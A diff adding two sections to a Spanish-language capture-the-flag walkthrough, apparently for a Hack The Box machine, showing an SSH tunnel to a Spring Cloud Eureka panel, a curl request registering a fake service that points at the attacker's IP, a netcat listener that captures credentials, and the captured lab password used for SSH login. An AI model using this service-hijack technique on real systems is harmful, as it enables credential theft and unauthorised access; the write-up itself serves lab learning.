@@ -190,8 +190,91 @@
    <img width="957" height="768" alt="image" src="https://github.com/user-attachments/assets/a2f98c25-0dcb-4fee-8bfc-358b54d68262" />
 
 
+
   Ahora revisamos que servicios estan expuestos en localhost con:
 
   ```bash
     ss -tlnp | grep LISTEN
   ```
+
+  <img width="620" height="183" alt="image" src="https://github.com/user-attachments/assets/e6397b5a-2940-4856-9bb4-14182d2b69bf" />
+
+
+
+### 14. Túnel SSH hacia Eureka 
+
+    Al ejecutar ss -tlnp | grep LISTEN dentro de la máquina Eureka, encontramos que el puerto 8761 está en escucha desde cualquier interfaz (*:8761). Este puerto corresponde al servicio Eureka (Service Discovery     de Spring Cloud).
+
+    Para interactuar con este servicio desde fuera de la máquina, creamos un túnel SSH desde nuestra máquina Kali:
+
+    ```bash
+    ssh -N -L 8761:localhost:8761 oscar190@furni.htb
+    ```
+
+   <img width="805" height="265" alt="image" src="https://github.com/user-attachments/assets/39a1e345-6c2c-4401-a4ae-a07aae2ebaa8" />
+
+   Ahora accedemos al panel Eureka, abrimos el navegador en:
+
+   ```bash
+   http://localhost:8761
+   ```
+
+   Podemos ver el panel de Eureka Server, aqui están registrados los microservicios. 
+   
+   El objetivo será inyectar un servicio falso que apunte a mi  propia IP y nos entregue información o incluso acceso.
+
+   <img width="1472" height="783" alt="image" src="https://github.com/user-attachments/assets/c713fec7-ca03-43e8-95dd-82b6c04edef1" />
+
+   Ahora hacemos la peticion ´curl´ para poder registrar el servicio
+
+   ```bash
+   curl -X POST \
+   http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
+   -H 'Content-Type: application/json' \
+   -d '{
+        "instance": {
+          "instanceId": "USER-MANAGEMENT-SERVICE",
+          "hostName": "10.10.14.209",
+          "app": "USER-MANAGEMENT-SERVICE",
+          "ipAddr": "10.10.14.209",
+          "vipAddress": "USER-MANAGEMENT-SERVICE",
+          "secureVipAddress": "USER-MANAGEMENT-SERVICE",
+          "status": "UP",
+          "port": { "$": 8081, "@enabled": "true" },
+          "dataCenterInfo": {
+            "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
+            "name": "MyOwn"
+          }
+        }
+      }'
+   ´´´
+
+   Esto registra un servicio con IP 10.10.14.209 (nuestra máquina Kali) en el puerto 8081.
+
+
+   Ahora configuramos un listener para poder capturar credenciales:
+
+   Abrimos con ´netcat´
+
+   ```bash
+   rlwrap nc -nlvp 8081
+   ```
+
+   <img width="782" height="407" alt="image" src="https://github.com/user-attachments/assets/03f73914-e656-4e2b-a9c9-af155f5a2a7a" />
+
+### 15. Acceso por SSH como "miranda-wise"
+
+   Una vez capturadas las credenciales desde el reverse shell:
+
+   **USUARIO** : miranda-wise 
+
+   **CONTRASEÑA** : IL!veT0Be&BeT0L0ve
+
+   Ahora probamos el acceso por SSH:
+
+    ```bash
+    ssh miranda-wise@10.10.11.66
+    ´´´
+
+   <img width="886" height="580" alt="image" src="https://github.com/user-attachments/assets/c62693b5-812c-4d47-879d-fabaf641c73f" />
+ 
